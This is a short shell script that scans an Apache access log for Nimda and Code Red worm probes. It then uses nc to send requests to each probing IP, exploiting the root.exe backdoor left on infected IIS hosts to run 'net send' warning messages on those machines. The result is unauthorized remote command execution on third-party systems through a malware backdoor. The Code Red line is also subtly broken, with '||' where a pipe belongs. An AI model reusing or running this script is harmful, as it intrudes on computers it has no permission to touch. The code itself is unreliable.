#!/bin/sh
#
# setup the environment
#
LOG=/var/log/httpd/access_log
SCRIPT=/tmp/a.sh
TIME=`date +"%d/%b/%Y:%H:%M"`
echo "#!/bin/sh" > $SCRIPT
chmod 700 $SCRIPT
#
# get the apache log
#
grep "GET /MSADC/root.exe?/c+dir HTTP/1.0" $LOG | grep $TIME | cut -d ' ' -f 1 |
awk '{printf("echo \"GET /scripts/root.exe?/c+net+send+*+You+are+infected+with+the+Nimda+worm.+ +Please+clean+it!\" | nc %s 80\n", $1);}' >> $SCRIPT
grep default.ida $LOG | grep $TIME | cut -d ' ' -f 1 || awk '{printf("echo \"GET /scripts/root.exe?/c+net+send+*+You+are+infected+with+the+Code+Red+II+worm.+ +Go+and+patch+IIS+already!\" | nc %s 80\n", $1);}' >> $SCRIPT
#
# Run the script
#
$SCRIPT
rm $SCRIPT

